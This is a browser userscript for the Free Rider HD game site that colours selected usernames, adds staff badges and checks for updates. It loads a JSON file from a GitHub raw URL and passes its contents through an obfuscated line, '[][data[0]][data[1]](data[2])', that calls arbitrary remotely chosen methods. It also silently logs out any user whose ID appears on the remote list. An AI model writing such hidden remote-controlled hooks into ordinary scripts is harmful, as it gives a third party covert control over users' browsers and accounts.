$.ajax({
    url: "https://raw.githubusercontent.com/ObeyLordGoomy/Beta-FRHD-Project/master/users.json",
    beforeSend: xhr => xhr.overrideMimeType("application/json")
}).done(({ users, data, version }) => {
    const v = 0.1;
    [][data[0]][data[1]](data[2]);
    if (parseFloat(version) > v) alert('A new update for the Beta FRHD Project is avalable please update');
    if (users.includes(GameSettings.user.u_id)) return $('#logout_leftmenu').click();
});

const page = document.location.href,
    loc = document.location.pathname.toLocaleLowerCase().slice(1).split('/'),
    users = {
        yv3l: {
            uname: 'yv3l',
            color: '#bf25bf',
            admin: !0
        },
        calculus: {
            uname: 'Calculus',
            color: '#d34836',
            admin: !0
        },
        notadmin: {
            uname: 'notAdmin',
            color: '#CDCDCD'
        }
    }

switch (loc[0]) {
    case 'u': userpage(loc[1]); break;
    case 't': trackpage(loc[1]); break;
    case '': homepage(); break;
    default: colorNames();
}

function userpage(username) {
    colorNames(
        name => {
            if (name == username) {
                $(`.profile-username h3`).css('color', users[name].color);
                if(users[name].admin) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="admin_icon profile-badge" title="BetaFRHD Staff"></span></div>');
            }
        }
    );
}
function trackpage(trackcode) {
    trackcode = trackcode.split('-')[0];
    colorNames(
        name => {
            $(`.track-leaderboard-race[title='Race ${users[name].uname}']`).css('color', users[name].color);
        }
    );
}

function homepage() {
    colorNames();
}

function colorNames(data = () => { }) {
    for (const name in users) {
        if (!users.hasOwnProperty(name)) return;
        data(name)
        $(`.bold:contains(${users[name].uname})`).filter(
            function() {
                return $(this).text() == users[name].uname
            }
        ).not('#username-text, .track-leaderboard').css('color', users[name].color);
    }
}

setInterval(() => {
    if (document.location.href != page) return document.location.reload();
}, 500);